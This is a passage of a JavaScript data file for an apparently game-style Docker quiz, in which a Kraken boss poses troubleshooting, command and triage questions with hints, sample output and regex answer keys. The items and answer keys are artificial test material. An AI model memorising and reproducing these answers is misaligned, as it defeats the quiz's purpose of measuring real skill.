            { id: 'a', label: 'Always use multi-stage builds for every Dockerfile, regardless of what it does', tier: 'defensible', why: 'Not harmful, but adds real unnecessary complexity for a Dockerfile that never needed build-only tooling separated from its runtime in the first place — a blanket rule instead of judgment.' },
            { id: 'b', label: 'Use multi-stage specifically when build-only tools would otherwise ship in the final runtime image', tier: 'best', why: 'Matches the fix to the actual problem — multi-stage exists specifically to keep compilers/build dependencies out of the image that actually runs in production.' },
            { id: 'c', label: 'Never bother — image size doesn\'t really matter in practice', tier: 'wrong', why: 'Larger images mean slower pulls/deploys and a bigger attack surface (unnecessary tools available inside a compromised container) — this is a real, well-documented cost, not a non-issue.' }
          ],
          justificationPatterns: [/build.?only|final\s*image|multi.?stage|ship.*production|keep.*out/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s ink spreads. <strong>A container keeps dying, and each time, it exits with code 137. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: 'Exit code 137 is a very specific, well-known signal — check the container\'s own inspect output for a flag that confirms exactly why it was killed.',
          hintPartial: 'docker inspect shows "OOMKilled": true — the container hit its configured memory limit and the kernel killed it, not an app crash.',
          hintFull: 'Diagnosis: the container is being OOM-killed after hitting its configured memory limit. Fix: either raise the memory limit to match real need, or investigate/fix excessive memory usage in the app itself.',
          outputBlock: [
            '$ docker ps -a',
            'CONTAINER ID   STATUS',
            'a1b2c3d4       Exited (137) 3 minutes ago',
            '',
            '$ docker inspect a1b2c3d4 | grep OOMKilled',
            '"OOMKilled": true'
          ],
          acceptableDiagnosesPatterns: [/oom.?kill/i, /memory\s*limit/i, /out\s*of\s*memory/i],
          followUpFix: {
            prompt: 'Check the app\'s actual memory usage pattern before just raising the limit blindly:',
            acceptablePatterns: [],
            optimalPatterns: [/^docker\s+stats\s+a1b2c3d4$/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'Ink darkens the water. <strong>Every "docker build" takes just as long as the first one, even for a one-line code change — the cache never seems to help. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: 'Look at the ORDER of instructions in the Dockerfile — a COPY of everything, placed before the dependency-install step, invalidates that step\'s cache on every single code change.',
          hintPartial: 'The Dockerfile copies the whole source tree BEFORE running npm install — since the source changes every commit, that COPY (and everything after it, including the install) never gets to reuse cache.',
          hintFull: 'Diagnosis: dependency installation is placed after a COPY of the full source, so it re-runs on every code change. Fix: reorder to COPY just the dependency manifest first, install, THEN copy the rest of the source.',
          outputBlock: [
            'Dockerfile:',
            'FROM node:18',
            'COPY . .',
            'RUN npm install',
            '',
            '(every build shows "RUN npm install" taking the full 90 seconds, cache never hits)'
          ],
          acceptableDiagnosesPatterns: [/cache.*(invalidat|miss)/i, /copy.*before.*install/i, /wrong\s*order/i],
          followUpFix: {
            prompt: 'Fix the Dockerfile order to actually benefit from layer caching:',
            acceptablePatterns: [],
            optimalPatterns: [/COPY\s+package\.json/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken groans from below. <strong>"docker push" fails with an authentication error. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: 'Pushing to a registry requires an active, valid login session with that specific registry — check whether one actually exists.',
          hintPartial: 'The error says "unauthorized" — there\'s no active authenticated session with this registry at all.',
          hintFull: 'Diagnosis: not authenticated with the target registry. Fix: run docker login for that registry before pushing again.',
          outputBlock: [
            '$ docker push registry.example.com/myapp:1.0',
            'unauthorized: authentication required'
          ],
          acceptableDiagnosesPatterns: [/not\s*(logged\s*in|authenticated)/i, /no\s*(active\s*)?(login|session)/i, /authentication/i],
          followUpFix: {
            prompt: 'Log in to the registry, then push again:',
            acceptablePatterns: [],
            optimalPatterns: [/^docker\s+login\s+registry\.example\.com$/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s form swells with ink. <strong>An image is far larger than expected for how simple the app actually is. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: 'Check the image\'s layer history for anything that installed a lot of packages and never cleaned up after itself — leftover package-manager cache is a classic silent size bloat.',
          hintPartial: 'docker history shows a RUN apt-get install layer that never cleaned the apt package cache afterward — that leftover cache is dead weight sitting in every image built from it.',
          hintFull: 'Diagnosis: unremoved package-manager cache from an apt-get install layer is bloating the image. Fix: chain the install and cleanup into the SAME RUN instruction so the cache never becomes a permanent layer.',
          outputBlock: [
            '$ docker images myapp',
            'REPOSITORY   TAG   SIZE',
            'myapp        1.0   1.8GB',
            '',
            '$ docker history myapp:1.0',
            'RUN apt-get update && apt-get install -y build-essential   450MB'
          ],
          acceptableDiagnosesPatterns: [/apt.?get\s*cache/i, /leftover\s*(package\s*)?cache/i, /never\s*clean(ed)?\s*up/i],
          followUpFix: {
            prompt: 'Fix it so the install and cleanup happen in the same layer:',
            acceptablePatterns: [],
            optimalPatterns: [/apt-get\s+install.*&&.*rm\s+-rf\s+\/var\/lib\/apt\/lists/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s eyes glow strangely. <strong>An image that runs fine locally fails in CI with "exec format error". Diagnose it, then fix it.</strong>',
          damageIfCorrect: 22, damageIfOptimal: 36, timeAllotted: 40,
          hintNudge: '"exec format error" is a classic sign the binary inside the image was built for a different CPU architecture than the machine trying to run it.',
          hintPartial: 'The image was built on an ARM machine (like an Apple Silicon laptop) but CI runs on AMD64 — the compiled binary inside literally can\'t execute on a mismatched architecture.',
          hintFull: 'Diagnosis: an architecture mismatch — the image was built for ARM64 but is being run on an AMD64 CI runner. Fix: build (or specify) for the correct target platform, e.g. using buildx with --platform linux/amd64.',
          outputBlock: [
            '$ docker run myapp',
            'standard_init_linux.go:228: exec user process caused: exec format error',
            '',
            '$ docker inspect myapp | grep Architecture',
            '"Architecture": "arm64"'
          ],
          acceptableDiagnosesPatterns: [/architecture\s*mismatch/i, /wrong\s*(cpu\s*)?architecture/i, /arm.*(amd64|x86)/i],
          followUpFix: {
            prompt: 'Rebuild targeting the correct platform for CI:',
            acceptablePatterns: [],
            optimalPatterns: [/docker\s+buildx\s+build.*--platform\s+linux\/amd64/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Kraken churns a whirlpool. <strong>Sequence the correct order for building a genuinely minimal production image with a multi-stage build.</strong>',
          steps: [
            'Build stage: FROM a full SDK/toolchain image, compile the app',
            'Final stage: FROM a minimal base image',
            'COPY --from the build stage, only the compiled artifact',
            'Add a non-root USER before the final CMD',
            'Confirm the final image size with docker images'
          ],
          damageIfCorrect: 24, damageIfOptimal: 40,
          damageToHeroIfWrong: 22
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'Ink billows in a slow ring. <strong>Sequence the correct order for diagnosing and resolving an OOM-killed container.</strong>',
          steps: [
            'Confirm OOMKilled via docker inspect',
            'Check actual memory usage pattern with docker stats',
            'Decide whether to raise the memory limit or fix a real leak in the app',
            'Redeploy with the fix and monitor it afterward'
          ],
          damageIfCorrect: 24, damageIfOptimal: 40,
          damageToHeroIfWrong: 22
        }
      ]
    },
    {
      name: 'Level 4 — Real Incidents',
      hp: 155,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s grip tightens: <strong>"Run <code>web</code> so it automatically restarts if it crashes, but NOT if you deliberately stop it yourself."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 32,
          hintNudge: 'Docker\'s restart-policy flag has an option specifically distinguishing "crashed" from "deliberately stopped."',
          hintPartial: 'docker run --restart _______-_______ web',
          hintFull: 'docker run --restart unless-stopped web',
          acceptablePatterns: [/^docker\s+run\s+--restart\s+on-failure\s+web$/i],
          optimalPatterns: [/^docker\s+run\s+--restart\s+unless-stopped\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A rumble builds: <strong>"Show only the last 100 log lines from <code>web</code>, from within the past hour."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 32,
          hintNudge: 'docker logs has both a time-window flag and a line-count flag — combine them.',
          hintPartial: 'docker logs --since _ --tail ___ web',
          hintFull: 'docker logs --since 1h --tail 100 web',
          acceptablePatterns: [/^docker\s+logs\s+--tail\s+100\s+web$/i],
          optimalPatterns: [/^docker\s+logs\s+--since\s+1h\s+--tail\s+100\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken looms over the wreckage: <strong>"Show a breakdown of exactly how much disk space images, containers, and volumes are each using."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 32,
          hintNudge: 'One system-level subcommand shows disk usage broken down by category, like "df" but for Docker.',
          hintPartial: 'docker system __',
          hintFull: 'docker system df',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+system\s+df$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A tentacle reaches across the water: <strong>"Attach the ALREADY-RUNNING container <code>web</code> to the network <code>appnet</code>, without restarting it."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 32,
          hintNudge: 'A network subcommand attaches a live container to a network on the fly — no restart needed.',
          hintPartial: 'docker network _______ appnet web',
          hintFull: 'docker network connect appnet web',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+network\s+connect\s+appnet\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken pulls back a tentacle: <strong>"Detach the running container <code>web</code> from the network <code>appnet</code>."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 32,
          hintNudge: 'The counterpart to docker network connect.',
          hintPartial: 'docker network __________ appnet web',
          hintFull: 'docker network disconnect appnet web',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+network\s+disconnect\s+appnet\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink swirls with intent: <strong>"From INSIDE the container <code>web</code>, check whether it can reach <code>http://api:3000/health</code>."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 32,
          hintNudge: 'exec runs a new command inside a running container — combine it with a simple HTTP check tool.',
          hintPartial: 'docker exec web c___ -sf http://api:3000/health',
          hintFull: 'docker exec web curl -sf http://api:3000/health',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+exec\s+web\s+curl\s+-sf\s+http:\/\/api:3000\/health$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken shifts its bulk: <strong>"Raise the memory limit of the ALREADY-RUNNING container <code>web</code> to 1GB, without recreating it."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 32,
          hintNudge: 'A dedicated subcommand changes resource limits on a live container in place — no stop/recreate needed.',
          hintPartial: 'docker up____ --memory=1g web',
          hintFull: 'docker update --memory=1g web',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+update\s+--memory=1g\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A final ripple spreads: <strong>"Remove every stopped container on this host, without confirmation prompts."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 32,
          hintNudge: 'A dedicated cleanup subcommand for containers specifically — plus the same force flag as system prune.',
          hintPartial: 'docker container p____ -_',
          hintFull: 'docker container prune -f',
          acceptablePatterns: [/^docker\s+container\s+prune$/i],
          optimalPatterns: [/^docker\s+container\s+prune\s+-f$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken shows a warped scroll: <strong>"This container crashes once and just stays dead — nothing brings it back. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 32,
          hintNudge: 'Without an explicit restart policy, Docker\'s default is "never restart" — a crashed container just stays stopped forever.',
          hintPartial: 'Line 1 has no --restart flag at all — add one so a crash actually triggers a real restart instead of leaving it dead.',
          hintFull: 'Line 1 should read: docker run --restart on-failure myapp',
          codeBlock: [
            'docker run -d myapp'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/^docker\s+run\s+-d\s+--restart\s+(on-failure|unless-stopped|always)\s+myapp$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A scroll unravels: <strong>"This container never responds to <code>docker stop</code> and always gets force-killed, despite the app using exec-form CMD correctly. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 32,
          hintNudge: 'The ENTRYPOINT script itself launches the real app as a regular shell command — without "exec" in front of it, the real app still isn\'t PID 1, the shell script wrapping it is.',
          hintPartial: 'Line 2 (inside entrypoint.sh) runs the app as a plain command — prefix it with "exec" so it REPLACES the shell script process instead of running underneath it.',
          hintFull: 'Line 2 (entrypoint.sh) should read: exec node index.js',
          codeBlock: [
            '#!/bin/sh',
            'node index.js'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/^exec\s+node\s+index\.js$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken\'s eye flares: <strong>"This container keeps getting killed and restarted as \'unhealthy\', even though the app itself is fine. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 32,
          hintNudge: 'A HEALTHCHECK with too aggressive a timing (too-short timeout, too-frequent interval) can mark a genuinely healthy, slightly slow app as failing.',
          hintPartial: 'Line 2\'s --timeout=1s is far too short for a real health endpoint that can occasionally take a couple seconds — legitimate slow responses are being counted as failures.',
          hintFull: 'Line 2 should read: HEALTHCHECK --interval=30s --timeout=5s CMD curl -f http://localhost/health || exit 1',
          codeBlock: [
            'FROM myapp-base',
            'HEALTHCHECK --interval=5s --timeout=1s CMD curl -f http://localhost/health || exit 1'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/HEALTHCHECK\s+--interval=30s\s+--timeout=5s/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A stone panel grinds within the scroll: <strong>"This container always runs the wrong command — the Dockerfile\'s CMD is never actually used. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 32,
          hintNudge: 'A compose file\'s "command" field always overrides the image\'s own CMD entirely — check whether it\'s pointing at the wrong thing.',
          hintPartial: 'Line 3\'s command field runs a debug/no-op command instead of the app\'s real start command — remove it (to fall back to the image\'s own CMD) or fix it to the real one.',
          hintFull: 'Line 3 should either be removed entirely, or read: command: ["npm", "start"]',
          codeBlock: [
            'services:',
            '  web:',
            '    command: ["sleep", "infinity"]'
          ],
          buggyLineId: 2,
          correctFixPatterns: [/command:\s*\[\s*"npm"\s*,\s*"start"\s*\]/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken tilts curiously: <strong>"A production container just entered a restart loop. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 32,
          hintNudge: 'One option destroys the exact evidence of what\'s going wrong before looking at it. One option looks at that evidence first.',
          hintPartial: 'Check the logs from the crashing attempts BEFORE doing anything else — that\'s the actual root-cause evidence, and restarting/recreating risks losing it.',
          hintFull: 'Best: check docker logs (and docker inspect for exit code/restart count) FIRST — the crash reason is usually right there, and acting before looking risks masking or losing that evidence.',
          options: [
            { id: 'a', label: 'Immediately docker rm and recreate the container from scratch', tier: 'wrong', why: 'Throws away the exact evidence (logs, exit code, restart count) of why it\'s crash-looping in the first place — if the same underlying cause exists, the new container fails identically.' },
            { id: 'b', label: 'Check docker logs and docker inspect (exit code, restart count) first', tier: 'best', why: 'The crash reason is almost always visible right there — checking first, before any destructive action, is what actually lets you fix the real cause instead of just resetting the symptom.' },
            { id: 'c', label: 'Increase the restart policy\'s retry limit and let it keep trying', tier: 'wrong', why: 'Doesn\'t address why it\'s crashing at all — it just makes the same failure repeat more times, generating more noise without getting closer to a fix.' }
          ],
          justificationPatterns: [/logs\s*first|check\s*(the\s*)?logs|inspect|before\s*(acting|recreating)|evidence/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A tentacle curls in thought: <strong>"You need a quick container to run a one-off debugging command, then throw it away. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 32,
          hintNudge: 'One flag automatically cleans up the container the moment it exits, so a pile of one-off debug containers never accumulates.',
          hintPartial: 'The --rm flag automatically removes the container as soon as it exits, exactly matching "run it once, then throw it away."',
          hintFull: 'Best: docker run --rm ... — the container is automatically removed the instant it exits, so debug/one-off runs never leave clutter behind.',
          options: [
            { id: 'a', label: 'docker run normally, then remember to docker rm it afterward', tier: 'defensible', why: 'Works if you remember every time, but relies on manual follow-up — in practice, one-off debug containers pile up because that follow-up step gets forgotten.' },
            { id: 'b', label: 'docker run --rm', tier: 'best', why: 'Automatically cleans up the instant the container exits — exactly matches "one-off, then throw it away" with zero manual follow-up needed.' },
            { id: 'c', label: 'Use docker exec on an existing container instead of a new one', tier: 'defensible', why: 'Reasonable if a suitable running container already exists, but doesn\'t apply if the debugging needs an isolated, disposable environment of its own.' }
          ],
          justificationPatterns: [/--rm|automatically\s*(remove|clean)|one.?off|disposable/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken\'s voice bubbles: <strong>"A container\'s mounted config file was just updated on the host. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 32,
          hintNudge: 'The question is whether the app actually re-reads its config file on a restart, or only ever reads it once at process startup — either way, a plain restart is enough here since the volume mount itself didn\'t change, only the file\'s contents.',
          hintPartial: 'Since it\'s the same mounted file (not the image) that changed, a plain docker restart (not a full recreate) is enough to make the app re-read it on its next startup.',
          hintFull: 'Best: docker restart — the volume mount is unchanged, so the running container will see the updated file content the next time its process starts up; no need to fully recreate the container since the underlying image/config didn\'t change.',
          options: [
            { id: 'a', label: 'docker rm and fully recreate the container from scratch', tier: 'defensible', why: 'Would work, but is more disruptive than needed — the image and mount setup haven\'t changed, only the file\'s contents, so a full recreate is more action than the situation calls for.' },
            { id: 'b', label: 'docker restart the container', tier: 'best', why: 'The mounted file\'s content updates on the host filesystem immediately — a restart is enough to make the app re-read it on startup, since nothing about the image or mount itself changed.' },
            { id: 'c', label: 'Do nothing — the app will pick up the change automatically', tier: 'wrong', why: 'Most apps read their config once at startup, not continuously — assuming automatic pickup without checking is a common, easy-to-miss real bug.' }
          ],
          justificationPatterns: [/restart|re-?read.*startup|mount.*unchanged|same\s*(image|mount)/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken churns thoughtfully: <strong>"A containerized service is hitting its CPU limit under increased traffic. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 32,
          hintNudge: 'Containers are specifically designed to be easy to run MANY identical copies of at once, behind a load balancer — that\'s usually a more natural fit than making one container bigger.',
          hintPartial: 'Scaling out to more container replicas (behind a load balancer) is the pattern containers are built around — it\'s typically the more natural, more resilient answer than making one container\'s resource limit bigger.',
          hintFull: 'Best: scale horizontally — run more replicas of the container behind a load balancer. This is the pattern container orchestration is built around, and it also improves resilience (one replica dying doesn\'t take down the whole service).',
          options: [
            { id: 'a', label: 'Just raise the single container\'s CPU limit (--cpus) as high as the host allows', tier: 'defensible', why: 'A real short-term option, but eventually hits the ceiling of a single host/container and provides no resilience — if that one container dies, the whole service goes down.' },
            { id: 'b', label: 'Run more replicas of the container behind a load balancer', tier: 'best', why: 'The pattern containers and container orchestration are specifically built around — spreads load across multiple instances and adds real resilience, not just more headroom on one instance.' },
            { id: 'c', label: 'Move the service off containers entirely onto a dedicated bare-metal server', tier: 'wrong', why: 'A drastic architectural regression to solve a scaling problem containers are specifically good at solving — throws away the exact flexibility that made containers the right choice in the first place.' }
          ],
          justificationPatterns: [/horizontal|more\s*replicas|load\s*balancer|scale\s*out/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken\'s presence darkens: <strong>"A security scan just flagged a known vulnerability in the base image already running in production. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 22, damageIfOptimal: 38, timeAllotted: 32,
          hintNudge: 'The right urgency depends on the vulnerability\'s actual severity/exploitability — not a fixed "always drop everything" or "always wait for the next release" rule.',
          hintPartial: 'Check the vulnerability\'s real severity and whether it\'s actually exploitable in this app\'s context before deciding how urgently to act.',
          hintFull: 'Best: assess actual severity/exploitability first — for a genuinely critical, exploitable issue, rebuild on the patched base and redeploy promptly; for a low-severity or non-applicable one, it can reasonably wait for the next normal release cycle.',
          options: [
            { id: 'a', label: 'Ignore it — the scan tool flags too many low-priority issues to act on all of them', tier: 'wrong', why: 'Might be true in general, but dismissing this SPECIFIC finding without even checking its actual severity risks ignoring something genuinely critical and exploitable.' },
            { id: 'b', label: 'Check the actual severity/exploitability first, then rebuild and redeploy promptly if it\'s genuinely critical', tier: 'best', why: 'Matches real urgency to real risk — a genuinely critical, exploitable vulnerability in a production image deserves prompt action; not every flagged finding does.' },
            { id: 'c', label: 'Immediately rebuild and redeploy for every flagged vulnerability, regardless of severity', tier: 'defensible', why: 'Errs toward safety, but treats every finding as equally urgent, which in practice leads to constant emergency redeploys for low-risk issues that could safely wait for a normal release.' }
          ],
          justificationPatterns: [/severity|exploitable|assess|critical|risk.?based/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s ink spreads. <strong>A container is stuck restarting over and over. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'Check its logs from right before each restart — a container that dies on every startup attempt almost always logs exactly why before it exits.',
          hintPartial: 'The logs show a missing required environment variable causing the app to exit immediately on every single start attempt.',
          hintFull: 'Diagnosis: the app crashes on startup because a required environment variable is missing. Fix: supply the missing environment variable and restart the container.',
          outputBlock: [
            '$ docker logs web --tail 20',
            'Error: Missing required environment variable DATABASE_URL',
            'Process exiting.',
            '(repeats on every restart)'
          ],
          acceptableDiagnosesPatterns: [/missing\s*(required\s*)?(env|environment)\s*variable/i, /missing\s*config/i],
          followUpFix: {
            prompt: 'Supply the missing variable and restart:',
            acceptablePatterns: [],
            optimalPatterns: [/docker\s+run.*-e\s+DATABASE_URL=/i, /docker\s+update.*DATABASE_URL/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'Ink darkens the water. <strong>The host\'s disk is nearly full, and Docker seems to be the cause. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'Docker\'s own disk-usage breakdown will show exactly which category (images, containers, volumes, build cache) has a huge amount of reclaimable space sitting unused.',
          hintPartial: 'docker system df shows tens of GB of reclaimable space in old, unused images and build cache — that\'s the actual disk hog, not any single running container.',
          hintFull: 'Diagnosis: unused images, stopped containers, and build cache have accumulated over time and are consuming most of the disk. Fix: run docker system prune (carefully, checking what it will remove first) to reclaim the space.',
          outputBlock: [
            '$ docker system df',
            'TYPE            TOTAL   ACTIVE   SIZE      RECLAIMABLE',
            'Images          84      3        62GB      58GB (93%)',
            'Build Cache     212     0        14GB      14GB (100%)'
          ],
          acceptableDiagnosesPatterns: [/unused\s*images/i, /build\s*cache/i, /accumulated/i, /reclaimable/i],
          followUpFix: {
            prompt: 'Reclaim the space:',
            acceptablePatterns: [/^docker\s+image\s+prune\s+-a\s+-f$/i],
            optimalPatterns: [/^docker\s+system\s+prune\s+-a\s+-f$/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken groans from below. <strong>A container can reach the internet fine, but can\'t resolve a specific internal hostname. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'Check what DNS server the container is actually configured to use — a container can have working general internet DNS but still miss an internal-only hostname if it\'s not pointed at the internal DNS server.',
          hintPartial: 'The container is using a public DNS resolver, which has no knowledge of the company\'s internal-only hostname — it needs to be pointed at the internal DNS server specifically.',
          hintFull: 'Diagnosis: the container\'s DNS resolver doesn\'t know about the internal hostname (it\'s using a public resolver, not the internal one). Fix: run the container with an explicit --dns flag pointing at the internal DNS server.',
          outputBlock: [
            '$ docker exec web nslookup internal-api.corp',
            ';; connection timed out',
            '',
            '$ docker exec web cat /etc/resolv.conf',
            'nameserver 8.8.8.8'
          ],
          acceptableDiagnosesPatterns: [/wrong\s*dns/i, /public\s*(dns\s*)?resolver/i, /not\s*using\s*internal\s*dns/i],
          followUpFix: {
            prompt: 'Fix it by pointing the container at the internal DNS server:',
            acceptablePatterns: [],
            optimalPatterns: [/docker\s+run.*--dns/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A crack of ink splits the water. <strong>"docker logs" shows nothing at all for a service you know is running and handling traffic. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'docker logs only captures what the container\'s main process writes to stdout/stderr — check where the app is ACTUALLY sending its log output.',
          hintPartial: 'The app is configured to write logs to a file inside the container instead of stdout/stderr — docker logs has nothing to show because nothing is ever written to the streams it captures.',
          hintFull: 'Diagnosis: the app logs to an internal file, not stdout/stderr, so docker logs captures nothing. Fix: reconfigure the app\'s logging to write to stdout/stderr instead (the standard container logging convention).',
          outputBlock: [
            '$ docker logs web',
            '(completely empty, despite active traffic)',
            '',
            '$ docker exec web cat /var/log/app/access.log',
            '(full of real request logs)'
          ],
          acceptableDiagnosesPatterns: [/logs?\s*to\s*a?\s*file/i, /not\s*(writing\s*to\s*)?stdout/i, /internal\s*log\s*file/i],
          followUpFix: {
            prompt: 'Fix the app\'s logging config to write to stdout/stderr instead:',
            acceptablePatterns: [],
            optimalPatterns: [/stdout/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s eyes narrow to slits. <strong>A container\'s health check keeps failing, even though curling the same endpoint from the HOST works fine. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'A HEALTHCHECK command runs INSIDE the container\'s own filesystem — check whether the tool it uses (like curl) is actually installed in that image at all.',
          hintPartial: 'The HEALTHCHECK uses curl, but this minimal base image never had curl installed — the check itself is failing with "command not found," which Docker reports as an unhealthy container.',
          hintFull: 'Diagnosis: the health-check command relies on a tool (curl) that isn\'t installed inside the container\'s own minimal image. Fix: install curl in the Dockerfile, or switch the health check to a tool that\'s actually present.',
          outputBlock: [
            '$ docker inspect web --format \'{{.State.Health.Log}}\'',
            '[{ExitCode:127 Output:"/bin/sh: curl: not found"}]',
            '',
            '$ curl http://<host-ip>:8080/health',
            '200 OK'
          ],
          acceptableDiagnosesPatterns: [/curl.*not\s*(installed|found)/i, /tool.*missing.*(inside|image)/i, /command\s*not\s*found/i],
          followUpFix: {
            prompt: 'Fix the Dockerfile so the health-check tool actually exists in the image:',
            acceptablePatterns: [],
            optimalPatterns: [/RUN.*install.*curl/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s final coil tightens. <strong>A long-running container is slowly accumulating zombie (defunct) processes. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 24, damageIfOptimal: 40, timeAllotted: 32,
          hintNudge: 'On a normal Linux system, PID 1 (init) automatically reaps dead child processes — inside a container, whatever IS PID 1 has to do that same job, and most app processes were never built to.',
          hintPartial: 'The app itself is PID 1 inside the container and forks child processes, but it was never designed to reap them — a real init system needs to hold PID 1 instead.',
          hintFull: 'Diagnosis: the app process is PID 1 but doesn\'t reap its own dead children (a normal init process would). Fix: run the container with Docker\'s built-in --init flag, which inserts a minimal init process to handle reaping correctly.',
          outputBlock: [
            '$ docker exec web ps aux',
            'PID   STAT  COMMAND',
            '1     Ss    node app.js',
            '842   Z     [worker] <defunct>',
            '843   Z     [worker] <defunct>',
            '(zombie count keeps climbing over days)'
          ],
          acceptableDiagnosesPatterns: [/no\s*init/i, /not\s*reaping/i, /pid\s*1.*(doesn'?t|not)\s*reap/i, /zombie/i],
          followUpFix: {
            prompt: 'Fix it by running the container with a real init process:',
            acceptablePatterns: [],
            optimalPatterns: [/docker\s+run.*--init/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Kraken churns a whirlpool. <strong>Sequence the correct order for updating a running production container to a new image version with minimal downtime.</strong>',
          steps: [
            'Pull the new image version',
            'Start a new container from the new image (different name/port temporarily if needed)',
            'Verify the new container is healthy',
            'Switch traffic to the new container (or swap the name/port)',
            'Remove the old container'
          ],
          damageIfCorrect: 26, damageIfOptimal: 42,
          damageToHeroIfWrong: 24
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'Ink billows in a slow ring. <strong>Sequence the correct order for responding to a crash-looping production container.</strong>',
          steps: [
            'Check docker logs for the crash reason',
            'Check docker inspect for exit code and restart count',
            'Identify the root cause (config, code, or resource limit)',
            'Apply the fix',
            'Redeploy and monitor that it stays healthy'
          ],
          damageIfCorrect: 26, damageIfOptimal: 42,
          damageToHeroIfWrong: 24
        }
      ]
    },
    {
      name: 'Level 5 — Interview-Caliber Judgment',
      hp: 175,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s form hardens: <strong>"Run <code>myapp</code> with a read-only root filesystem, so the app itself can\'t write anywhere inside the container."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30,
          hintNudge: 'A single security-hardening flag on docker run makes the entire container filesystem read-only.',
          hintPartial: 'docker run --____-____ myapp',
          hintFull: 'docker run --read-only myapp',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+--read-only\s+myapp$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A deep growl: <strong>"Scan the image <code>myapp:1.0</code> for known vulnerabilities."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30,
